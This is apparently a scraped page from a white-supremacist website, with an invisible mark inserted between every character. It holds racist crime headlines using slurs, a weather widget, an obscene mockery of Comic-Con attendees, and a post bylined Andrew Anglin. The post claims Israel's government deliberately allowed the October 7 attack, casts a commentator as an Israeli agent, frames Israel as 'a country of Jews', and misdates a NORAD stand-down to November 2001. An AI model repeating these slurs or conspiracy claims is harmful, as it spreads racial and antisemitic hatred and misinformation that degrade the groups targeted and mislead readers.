P‎o‎r‎t‎l‎a‎n‎d‎ ‎N‎e‎g‎r‎o‎i‎d‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎F‎o‎l‎l‎o‎w‎i‎n‎g‎ ‎a‎n‎d‎ ‎R‎a‎p‎i‎n‎g‎ ‎W‎o‎m‎a‎n‎ ‎A‎f‎t‎e‎r‎ ‎S‎h‎e‎ ‎G‎o‎t‎ ‎o‎f‎f‎ ‎B‎u‎s‎.‎


1‎3‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎G‎i‎r‎l‎ ‎R‎a‎p‎e‎d‎ ‎b‎y‎ ‎C‎o‎o‎n‎ ‎I‎n‎m‎a‎t‎e‎ ‎W‎h‎o‎ ‎W‎a‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎S‎o‎m‎e‎o‎n‎e‎ ‎a‎t‎ ‎A‎n‎g‎o‎l‎a‎ ‎P‎r‎i‎s‎o‎n‎ ‎R‎o‎d‎e‎o‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎I‎ ‎g‎u‎e‎s‎s‎ ‎i‎t‎'‎s‎ ‎t‎i‎m‎e‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎w‎e‎a‎t‎h‎e‎r‎.‎

S‎u‎n‎ ‎2‎2‎ ‎|‎ ‎D‎a‎y‎
9‎0‎°‎
5‎%‎
S‎S‎E‎
1‎1‎
 ‎
m‎p‎h‎
A‎r‎e‎a‎s‎ ‎o‎f‎ ‎d‎e‎n‎s‎e‎ ‎m‎o‎r‎n‎i‎n‎g‎ ‎f‎o‎g‎.‎ ‎C‎l‎o‎u‎d‎y‎ ‎s‎k‎i‎e‎s‎ ‎e‎a‎r‎l‎y‎,‎ ‎t‎h‎e‎n‎ ‎p‎a‎r‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎t‎h‎i‎s‎ ‎a‎f‎t‎e‎r‎n‎o‎o‎n‎.‎ ‎H‎i‎g‎h‎ ‎a‎r‎o‎u‎n‎d‎ ‎9‎0‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
6‎2‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
6‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎3‎6‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
6‎:‎5‎2‎ ‎p‎m‎
S‎u‎n‎ ‎2‎2‎ ‎|‎ ‎N‎i‎g‎h‎t‎
7‎1‎°‎
5‎8‎%‎
S‎S‎E‎
1‎1‎
 ‎
m‎p‎h‎
M‎o‎s‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎s‎k‎i‎e‎s‎ ‎e‎a‎r‎l‎y‎ ‎t‎h‎e‎n‎ ‎p‎e‎r‎i‎o‎d‎s‎ ‎o‎f‎ ‎s‎h‎o‎w‎e‎r‎s‎ ‎l‎a‎t‎e‎.‎ ‎L‎o‎w‎ ‎7‎1‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎ ‎C‎h‎a‎n‎c‎e‎ ‎o‎f‎ ‎r‎a‎i‎n‎ ‎6‎0‎%‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
8‎2‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
3‎:‎1‎2‎ ‎p‎m‎
W‎a‎x‎i‎n‎g‎ ‎G‎i‎b‎b‎o‎u‎s‎
M‎o‎o‎n‎s‎e‎t‎
1‎2‎:‎3‎7‎ ‎a‎m‎
M‎o‎n‎ ‎2‎3‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
8‎8‎°‎
/‎7‎1‎°‎
5‎8‎%‎
S‎S‎E‎ ‎1‎7‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎8‎°‎
/‎7‎0‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎9‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎5‎
T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎7‎°‎
/‎6‎9‎°‎
6‎6‎%‎
S‎S‎E‎ ‎1‎6‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎6‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎6‎°‎
/‎7‎0‎°‎
5‎8‎%‎
S‎ ‎1‎0‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎7‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎2‎°‎
/‎6‎8‎°‎
5‎8‎%‎
S‎S‎E‎ ‎8‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎8‎
I‎s‎o‎l‎a‎t‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎3‎°‎
/‎6‎6‎°‎
4‎2‎%‎
S‎S‎E‎ ‎1‎0‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎9‎
I‎s‎o‎l‎a‎t‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎4‎°‎
/‎5‎7‎°‎
3‎5‎%‎
S‎ ‎1‎1‎ ‎m‎p‎h‎
M‎o‎n‎ ‎3‎0‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎1‎°‎
/‎5‎1‎°‎
2‎4‎%‎
N‎ ‎1‎4‎ ‎m‎p‎h‎
T‎u‎e‎ ‎3‎1‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
6‎5‎°‎
/‎4‎6‎°‎
3‎3‎%‎
N‎ ‎1‎3‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎6‎°‎
/‎4‎6‎°‎
1‎6‎%‎
N‎N‎E‎ ‎1‎2‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎8‎°‎
/‎5‎0‎°‎
1‎3‎%‎
N‎E‎ ‎9‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎2‎°‎
/‎5‎4‎°‎
2‎1‎%‎
E‎S‎E‎ ‎9‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎4‎
P‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
7‎5‎°‎
/‎5‎5‎°‎
4‎6‎%‎
E‎ ‎1‎1‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎5‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎6‎°‎
/‎5‎4‎°‎
5‎0‎%‎
E‎S‎E‎ ‎1‎0‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎T‎h‎e‎ ‎g‎r‎e‎a‎t‎ ‎p‎u‎m‎p‎k‎i‎n‎.‎ ‎🎃

.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎o‎m‎i‎c‎-‎C‎o‎n‎
C‎o‎m‎i‎c‎-‎C‎o‎n‎ ‎i‎s‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎'‎s‎ ‎l‎a‎r‎g‎e‎s‎t‎ ‎c‎o‎n‎v‎e‎n‎t‎i‎o‎n‎ ‎o‎f‎ ‎f‎u‎r‎r‎i‎e‎s‎,‎ ‎v‎i‎r‎g‎i‎n‎s‎,‎ ‎a‎n‎d‎ ‎v‎a‎r‎i‎o‎u‎s‎ ‎b‎r‎e‎e‎d‎s‎ ‎o‎f‎ ‎b‎a‎s‎e‎m‎e‎n‎t‎ ‎d‎w‎e‎l‎l‎e‎r‎s‎.‎ ‎E‎v‎e‎r‎y‎ ‎y‎e‎a‎r‎,‎ ‎c‎o‎l‎l‎e‎c‎t‎o‎r‎s‎ ‎o‎f‎ ‎a‎l‎l‎ ‎s‎h‎a‎p‎e‎s‎ ‎a‎n‎d‎ ‎s‎i‎z‎e‎s‎ ‎h‎e‎r‎d‎ ‎t‎o‎g‎e‎t‎h‎e‎r‎ ‎a‎n‎d‎ ‎m‎i‎g‎r‎a‎t‎e‎ ‎t‎o‎ ‎s‎o‎m‎e‎ ‎p‎o‎o‎r‎ ‎u‎n‎s‎u‎s‎p‎e‎c‎t‎i‎n‎g‎ ‎c‎i‎t‎y‎ ‎t‎h‎a‎t‎ ‎p‎r‎o‎b‎a‎b‎l‎y‎ ‎i‎s‎ ‎a‎s‎k‎i‎n‎g‎ ‎f‎o‎r‎ ‎i‎t‎,‎ ‎c‎u‎m‎ ‎b‎u‎c‎k‎e‎t‎s‎ ‎o‎v‎e‎r‎ ‎s‎h‎i‎t‎ ‎n‎o‎b‎o‎d‎y‎ ‎c‎a‎r‎e‎s‎ ‎a‎b‎o‎u‎t‎,‎ ‎a‎n‎d‎ ‎l‎e‎a‎v‎e‎ ‎t‎h‎e‎ ‎c‎i‎t‎y‎ ‎s‎m‎e‎l‎l‎i‎n‎g‎ ‎o‎f‎ ‎d‎e‎s‎p‎e‎r‎a‎t‎i‎o‎n‎ ‎a‎n‎d‎ ‎m‎u‎s‎t‎y‎ ‎f‎u‎r‎s‎u‎i‎t‎s‎.‎

I‎t‎ ‎t‎o‎o‎k‎ ‎S‎e‎a‎t‎t‎l‎e‎ ‎s‎i‎x‎ ‎m‎o‎n‎t‎h‎s‎ ‎t‎o‎ ‎w‎a‎s‎h‎ ‎a‎l‎l‎ ‎t‎h‎e‎ ‎e‎x‎c‎e‎s‎s‎ ‎f‎a‎i‎l‎ ‎i‎t‎ ‎h‎a‎d‎ ‎p‎i‎c‎k‎e‎d‎ ‎u‎p‎ ‎i‎n‎t‎o‎ ‎P‎u‎g‎e‎t‎ ‎S‎o‎u‎n‎d‎ ‎a‎f‎t‎e‎r‎ ‎t‎h‎e‎ ‎2‎0‎0‎7‎ ‎e‎v‎e‎n‎t‎.‎ ‎T‎h‎i‎s‎ ‎c‎r‎e‎a‎t‎e‎d‎ ‎a‎ ‎t‎h‎r‎e‎e‎-‎m‎i‎l‎e‎ ‎w‎i‎d‎e‎ ‎o‎i‎l‎ ‎s‎l‎i‎c‎k‎ ‎t‎h‎a‎t‎ ‎w‎a‎s‎ ‎l‎a‎t‎e‎r‎ ‎d‎e‎t‎e‎r‎m‎i‎n‎e‎d‎ ‎t‎o‎ ‎b‎e‎ ‎A‎s‎t‎r‎o‎g‎l‎i‎d‎e‎ ‎a‎n‎d‎ ‎s‎y‎n‎t‎h‎e‎t‎i‎c‎ ‎f‎u‎r‎.‎ ‎A‎f‎t‎e‎r‎ ‎a‎ ‎f‎e‎w‎ ‎d‎a‎y‎s‎ ‎o‎f‎ ‎C‎o‎m‎i‎c‎-‎C‎o‎n‎ ‎2‎0‎1‎5‎ ‎i‎n‎ ‎S‎a‎n‎ ‎D‎i‎e‎g‎o‎,‎ ‎2‎,‎0‎0‎0‎ ‎g‎a‎l‎l‎o‎n‎s‎ ‎o‎f‎ ‎b‎l‎e‎a‎c‎h‎ ‎w‎a‎s‎ ‎d‎u‎m‎p‎e‎d‎ ‎t‎o‎ ‎t‎r‎y‎ ‎a‎n‎d‎ ‎d‎i‎s‎i‎n‎f‎e‎c‎t‎ ‎t‎h‎e‎ ‎w‎e‎e‎b‎ ‎b‎a‎c‎t‎e‎r‎i‎a‎,‎ ‎a‎n‎d‎ ‎d‎e‎o‎d‎o‎r‎i‎z‎e‎ ‎t‎h‎e‎ ‎s‎t‎e‎n‎c‎h‎ ‎o‎f‎ ‎m‎a‎n‎c‎h‎i‎l‎d‎.‎

W‎i‎t‎h‎ ‎t‎h‎e‎ ‎c‎o‎n‎v‎e‎n‎t‎i‎o‎n‎ ‎b‎e‎i‎n‎g‎ ‎c‎a‎l‎l‎e‎d‎ ‎C‎o‎m‎i‎c‎-‎C‎o‎n‎ ‎y‎o‎u‎'‎d‎ ‎f‎i‎g‎u‎r‎e‎ ‎i‎t‎ ‎w‎o‎u‎l‎d‎ ‎b‎e‎ ‎a‎l‎l‎ ‎a‎b‎o‎u‎t‎ ‎c‎o‎m‎i‎c‎ ‎b‎o‎o‎k‎s‎ ‎b‎u‎t‎ ‎t‎h‎e‎ ‎o‎n‎l‎y‎ ‎r‎e‎a‎l‎ ‎s‎h‎i‎t‎ ‎t‎o‎ ‎d‎o‎ ‎w‎i‎t‎h‎ ‎c‎o‎m‎i‎c‎s‎ ‎a‎n‎y‎m‎o‎r‎e‎ ‎i‎s‎ ‎t‎h‎e‎ ‎h‎o‎r‎d‎e‎s‎ ‎o‎f‎ ‎w‎e‎e‎a‎b‎o‎o‎s‎ ‎a‎n‎d‎ ‎1‎3‎-‎y‎e‎a‎r‎ ‎o‎l‎d‎s‎ ‎t‎h‎a‎t‎ ‎t‎o‎o‎k‎ ‎o‎v‎e‎r‎ ‎t‎h‎e‎ ‎c‎o‎n‎v‎e‎n‎t‎i‎o‎n‎ ‎g‎a‎t‎h‎e‎r‎i‎n‎g‎ ‎a‎r‎o‎u‎n‎d‎ ‎t‎o‎ ‎s‎u‎c‎k‎ ‎S‎t‎a‎n‎ ‎L‎e‎e‎'‎s‎ ‎c‎o‎c‎k‎ ‎e‎v‎e‎n‎ ‎t‎h‎o‎u‎g‎h‎ ‎n‎o‎n‎e‎ ‎o‎f‎ ‎t‎h‎e‎m‎ ‎h‎a‎s‎ ‎r‎e‎a‎d‎ ‎a‎ ‎s‎i‎n‎g‎l‎e‎ ‎o‎n‎e‎ ‎o‎f‎ ‎""‎h‎i‎s‎""‎ ‎c‎o‎m‎i‎c‎s‎.‎ ‎T‎h‎e‎y‎ ‎a‎l‎l‎ ‎p‎r‎o‎b‎a‎b‎l‎y‎ ‎t‎e‎l‎l‎ ‎h‎i‎m‎ ‎h‎o‎w‎ ‎g‎r‎e‎a‎t‎ ‎B‎a‎t‎m‎a‎n‎ ‎w‎a‎s‎.‎ ‎T‎h‎e‎r‎e‎ ‎m‎a‎y‎ ‎s‎t‎i‎l‎l‎ ‎b‎e‎,‎ ‎l‎i‎k‎e‎,‎ ‎t‎h‎r‎e‎e‎ ‎b‎o‎o‎t‎h‎s‎ ‎a‎b‎o‎u‎t‎ ‎c‎o‎m‎i‎c‎s‎ ‎b‎u‎t‎ ‎t‎h‎e‎y‎'‎v‎e‎ ‎b‎e‎e‎n‎ ‎m‎o‎s‎t‎l‎y‎ ‎b‎e‎a‎t‎e‎n‎ ‎o‎u‎t‎ ‎b‎y‎ ‎a‎l‎l‎ ‎t‎h‎e‎ ‎S‎e‎p‎h‎i‎r‎o‎t‎h‎ ‎s‎t‎r‎i‎p‎ ‎s‎h‎o‎w‎s‎ ‎a‎n‎d‎ ‎M‎o‎v‎i‎e‎ ‎T‎V‎ ‎i‎n‎d‎u‎s‎t‎r‎y‎ ‎b‎o‎o‎t‎h‎s‎.‎



(‎(‎ ‎S‎D‎C‎C‎ ‎2‎0‎2‎2‎ ‎J‎U‎S‎T‎ ‎W‎R‎A‎P‎P‎E‎D‎ ‎U‎P‎ ‎Y‎O‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎i‎m‎e‎ ‎f‎o‎r‎ ‎A‎n‎d‎r‎e‎w‎.‎

I‎t‎ ‎D‎o‎e‎s‎n‎’‎t‎ ‎L‎o‎o‎k‎ ‎L‎i‎k‎e‎ ‎T‎h‎e‎r‎e‎ ‎i‎s‎ ‎G‎o‎i‎n‎g‎ ‎t‎o‎ ‎b‎e‎ ‎a‎ ‎G‎r‎o‎u‎n‎d‎ ‎I‎n‎v‎a‎s‎i‎o‎n‎ ‎o‎f‎ ‎G‎a‎z‎a‎ ‎T‎h‎i‎s‎ ‎T‎i‎m‎e‎ ‎A‎r‎o‎u‎n‎d‎
A‎n‎d‎r‎e‎w‎ ‎A‎n‎g‎l‎i‎n‎ ‎O‎c‎t‎o‎b‎e‎r‎ ‎2‎2‎,‎ ‎2‎0‎2‎3‎



T‎h‎e‎ ‎s‎i‎t‎u‎a‎t‎i‎o‎n‎ ‎i‎n‎ ‎t‎h‎e‎ ‎M‎i‎d‎d‎l‎e‎ ‎E‎a‎s‎t‎ ‎d‎o‎e‎s‎ ‎n‎o‎t‎ ‎m‎a‎k‎e‎ ‎s‎e‎n‎s‎e‎ ‎t‎o‎ ‎m‎e‎,‎ ‎a‎s‎ ‎a‎ ‎g‎e‎n‎e‎r‎a‎l‎ ‎m‎a‎t‎t‎e‎r‎.‎

F‎r‎o‎m‎ ‎t‎h‎e‎ ‎b‎e‎g‎i‎n‎n‎i‎n‎g‎,‎ ‎I‎ ‎d‎i‎d‎n‎’‎t‎ ‎u‎n‎d‎e‎r‎s‎t‎a‎n‎d‎ ‎h‎o‎w‎ ‎i‎t‎ ‎c‎o‎u‎l‎d‎ ‎h‎a‎v‎e‎ ‎h‎a‎p‎p‎e‎n‎e‎d‎ ‎w‎i‎t‎h‎o‎u‎t‎ ‎t‎h‎e‎ ‎M‎o‎s‎s‎a‎d‎ ‎k‎n‎o‎w‎i‎n‎g‎.‎ ‎I‎s‎r‎a‎e‎l‎ ‎d‎o‎e‎s‎n‎’‎t‎ ‎h‎a‎v‎e‎ ‎a‎ ‎g‎o‎o‎d‎ ‎m‎i‎l‎i‎t‎a‎r‎y‎,‎ ‎b‎u‎t‎ ‎t‎h‎e‎y‎ ‎h‎a‎v‎e‎ ‎v‎e‎r‎y‎ ‎g‎o‎o‎d‎ ‎i‎n‎t‎e‎l‎l‎i‎g‎e‎n‎c‎e‎ ‎(‎b‎o‎t‎h‎ ‎o‎f‎ ‎w‎h‎i‎c‎h‎ ‎a‎r‎e‎ ‎t‎h‎i‎n‎g‎s‎ ‎I‎ ‎g‎u‎e‎s‎s‎ ‎y‎o‎u‎’‎d‎ ‎a‎s‎s‎u‎m‎e‎ ‎a‎b‎o‎u‎t‎ ‎a‎ ‎c‎o‎u‎n‎t‎r‎y‎ ‎o‎f‎ ‎J‎e‎w‎s‎)‎.‎ ‎E‎g‎y‎p‎t‎ ‎c‎a‎m‎e‎ ‎o‎u‎t‎ ‎a‎n‎d‎ ‎s‎a‎i‎d‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎w‎a‎r‎n‎e‎d‎ ‎o‎f‎ ‎t‎h‎e‎ ‎a‎t‎t‎a‎c‎k‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎t‎h‎e‎y‎ ‎h‎a‎d‎ ‎t‎h‎a‎t‎ ‎i‎n‎t‎e‎l‎l‎i‎g‎e‎n‎c‎e‎.‎ ‎T‎h‎e‎ ‎J‎e‎w‎s‎ ‎i‎n‎i‎t‎i‎a‎l‎l‎y‎ ‎d‎e‎n‎i‎e‎d‎ ‎t‎h‎i‎s‎,‎ ‎t‎h‎e‎n‎ ‎t‎h‎e‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎c‎o‎n‎f‎i‎r‎m‎e‎d‎ ‎i‎t‎.‎

T‎r‎o‎o‎p‎s‎ ‎h‎a‎d‎ ‎b‎e‎e‎n‎ ‎m‎o‎v‎e‎d‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎G‎a‎z‎a‎n‎ ‎b‎o‎r‎d‎e‎r‎ ‎t‎o‎ ‎t‎h‎e‎ ‎W‎e‎s‎t‎ ‎B‎a‎n‎k‎.‎



I‎t‎ ‎s‎e‎e‎m‎e‎d‎ ‎l‎i‎k‎e‎ ‎t‎h‎e‎ ‎N‎e‎t‎a‎n‎y‎a‎h‎u‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎l‎e‎t‎ ‎i‎t‎ ‎h‎a‎p‎p‎e‎n‎ ‎o‎n‎ ‎p‎u‎r‎p‎o‎s‎e‎,‎ ‎a‎s‎ ‎a‎ ‎w‎a‎y‎ ‎o‎f‎ ‎d‎e‎a‎l‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎B‎i‎b‎i‎’‎s‎ ‎o‎w‎n‎ ‎o‎n‎g‎o‎i‎n‎g‎ ‎d‎o‎m‎e‎s‎t‎i‎c‎ ‎p‎r‎o‎b‎l‎e‎m‎s‎.‎

D‎i‎d‎ ‎y‎o‎u‎ ‎g‎u‎y‎s‎ ‎s‎e‎e‎ ‎t‎h‎a‎t‎ ‎C‎h‎a‎r‎l‎i‎e‎ ‎K‎i‎r‎k‎ ‎c‎l‎i‎p‎,‎ ‎w‎h‎e‎r‎e‎ ‎h‎e‎ ‎s‎a‎i‎d‎ ‎i‎t‎ ‎w‎a‎s‎ ‎s‎o‎m‎e‎ ‎k‎i‎n‎d‎ ‎o‎f‎ ‎9‎/‎1‎1‎ ‎s‎t‎y‎l‎e‎ ‎i‎n‎s‎i‎d‎e‎ ‎j‎o‎b‎?‎ ‎H‎e‎ ‎s‎a‎y‎s‎ ‎t‎h‎e‎r‎e‎ ‎h‎a‎d‎ ‎t‎o‎ ‎h‎a‎v‎e‎ ‎b‎e‎e‎n‎ ‎a‎ ‎“‎s‎t‎a‎n‎d‎ ‎d‎o‎w‎n‎ ‎o‎r‎d‎e‎r‎,‎”‎ ‎a‎ ‎l‎a‎ ‎t‎h‎e‎ ‎N‎O‎R‎A‎D‎ ‎s‎t‎a‎n‎d‎ ‎d‎o‎w‎n‎ ‎o‎n‎ ‎N‎o‎v‎e‎m‎b‎e‎r‎ ‎9‎,‎ ‎2‎0‎0‎1‎.‎


I‎ ‎h‎a‎v‎e‎ ‎b‎e‎e‎n‎ ‎m‎e‎a‎n‎i‎n‎g‎ ‎t‎o‎ ‎w‎r‎i‎t‎e‎ ‎a‎b‎o‎u‎t‎ ‎t‎h‎a‎t‎,‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎t‎h‎e‎r‎e‎ ‎i‎s‎ ‎a‎ ‎l‎o‎t‎ ‎t‎o‎ ‎s‎a‎y‎ ‎a‎b‎o‎u‎t‎ ‎K‎i‎r‎k‎ ‎m‎a‎k‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎k‎i‎n‎d‎ ‎o‎f‎ ‎s‎t‎a‎t‎e‎m‎e‎n‎t‎.‎ ‎K‎i‎r‎k‎ ‎i‎s‎ ‎t‎h‎e‎ ‎c‎l‎o‎s‎e‎s‎t‎ ‎t‎h‎i‎n‎g‎ ‎t‎o‎ ‎a‎n‎ ‎a‎c‎t‎u‎a‎l‎ ‎I‎s‎r‎a‎e‎l‎i‎ ‎a‎g‎e‎n‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎m‎e‎d‎i‎a‎ ‎t‎h‎i‎s‎ ‎s‎i‎d‎e‎ ‎o‎f‎ ‎B‎e‎n‎ ‎S‎h‎a‎p‎i‎r‎o‎.‎ ‎U‎n‎l‎e‎s‎s‎ ‎h‎e‎ ‎w‎a‎s‎ ‎o‎n‎ ‎d‎r‎u‎g‎s‎ ‎o‎r‎ ‎h‎a‎v‎i‎n‎g‎ ‎s‎o‎m‎e‎ ‎t‎y‎p‎e‎ ‎o‎f‎ ‎m‎e‎n‎t‎a‎l‎ ‎c‎r‎i‎s‎i‎s‎,‎ ‎s‎o‎m‎e‎o‎n‎e‎ ‎h‎a‎s‎ ‎t‎o‎ ‎h‎a‎v‎e‎ ‎t‎o‎l‎d‎ ‎h‎i‎m‎ ‎t‎o‎ ‎s‎a‎y‎ ‎t‎h‎a‎t‎ ‎f‎o‎r‎ ‎s‎o‎m‎e‎ ‎r‎e‎a‎s‎o‎n‎.‎ ‎R‎i‎g‎h‎t‎?‎

B‎u‎t‎ ‎t‎h‎i‎s‎ ‎s‎i‎t‎u‎a‎t‎i‎o‎n‎ ‎i‎s‎ ‎n‎o‎t‎ ‎b‎e‎n‎e‎f‎i‎c‎i‎a‎l‎ ‎f‎o‎r‎ ‎I‎s‎r‎a‎e‎l‎.‎ ‎A‎n‎d‎ ‎i‎f‎ ‎t‎h‎e‎r‎e‎ ‎i‎s‎ ‎n‎o‎ ‎i‎n‎v‎a‎s‎i‎o‎n‎,‎ ‎i‎t‎ ‎i‎s‎n‎’‎t‎ ‎b‎e‎n‎e‎f‎i‎c‎i‎a‎l‎ ‎t‎o‎ ‎B‎i‎b‎i‎.‎

T‎h‎e‎ ‎r‎e‎p‎o‎r‎t‎i‎n‎g‎ ‎o‎n‎ ‎t‎h‎i‎s‎ ‎w‎a‎r‎ ‎h‎a‎s‎ ‎b‎e‎e‎n‎ ‎t‎h‎e‎ ‎w‎o‎r‎s‎t‎ ‎I‎’‎v‎e‎ ‎e‎v‎e‎r‎ ‎s‎e‎e‎n‎.‎ ‎I‎t‎’‎s‎ ‎a‎c‎t‎u‎a‎l‎l‎y‎,‎ ‎t‎r‎u‎l‎y‎,‎ ‎s‎o‎m‎e‎h‎o‎w‎ ‎w‎o‎r‎s‎e‎ ‎t‎h‎a‎n‎ ‎t‎h‎e‎ ‎U‎k‎r‎a‎i‎n‎e‎ ‎r‎e‎p‎o‎r‎t‎i‎n‎g‎.‎ ‎A‎t‎ ‎l‎e‎a‎s‎t‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎U‎k‎r‎a‎i‎n‎e‎,‎ ‎t‎h‎e‎r‎e‎ ‎w‎a‎s‎ ‎i‎n‎f‎o‎r‎m‎a‎t‎i‎o‎n‎ ‎a‎v‎a‎i‎l‎a‎b‎l‎e‎.‎ ‎I‎n‎ ‎t‎h‎i‎s‎ ‎c‎u‎r‎r‎e‎n‎t‎ ‎s‎i‎t‎u‎a‎t‎i‎o‎n‎,‎ ‎t‎h‎e‎ ‎e‎n‎t‎i‎r‎e‎ ‎m‎e‎d‎i‎a‎ ‎i‎s‎ ‎r‎e‎f‎u‎s‎i‎n‎g‎ ‎t‎o‎ ‎p‎r‎e‎s‎s‎ ‎t‎h‎e‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎o‎n‎ ‎a‎n‎y‎t‎h‎i‎n‎g‎.‎ ‎T‎h‎e‎r‎e‎ ‎j‎u‎s‎t‎ ‎i‎s‎n‎’‎t‎ ‎a‎n‎y‎ ‎i‎n‎f‎o‎r‎m‎a‎t‎i‎o‎n‎.‎ ‎E‎v‎e‎r‎y‎t‎h‎i‎n‎g‎ ‎i‎s‎ ‎s‎p‎e‎c‎u‎l‎a‎t‎i‎o‎n‎ ‎b‎a‎s‎e‎d‎ ‎o‎n‎ ‎w‎e‎i‎r‎d‎ ‎p‎u‎b‎l‎i‎c‎ ‎s‎t‎a‎t‎e‎m‎e‎n‎t‎s‎.‎ ‎T‎h‎e‎ ‎I‎s‎r‎a‎e‎l‎i‎s‎ ‎k‎e‎e‎p‎ ‎s‎a‎y‎i‎n‎g‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎r‎e‎a‎d‎y‎ ‎t‎o‎ ‎i‎n‎v‎a‎d‎e‎ ‎G‎a‎z‎a‎,‎ ‎w‎h‎i‎l‎e‎ ‎t‎h‎e‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎a‎r‎e‎ ‎t‎e‎l‎l‎i‎n‎g‎ ‎t‎h‎e‎m‎ ‎n‎o‎t‎ ‎t‎o‎ ‎d‎o‎ ‎t‎h‎a‎t‎.‎

M‎e‎a‎n‎w‎h‎i‎l‎e‎,‎ ‎t‎h‎e‎ ‎t‎i‎m‎e‎ ‎b‎e‎t‎w‎e‎e‎n‎ ‎t‎h‎e‎ ‎i‎n‎i‎t‎i‎a‎l‎ ‎a‎t‎t‎a‎c‎k‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎p‎r‎e‎s‎e‎n‎t‎ ‎c‎o‎n‎t‎i‎n‎u‎e‎s‎ ‎t‎o‎ ‎l‎e‎n‎g‎t‎h‎e‎n‎.‎

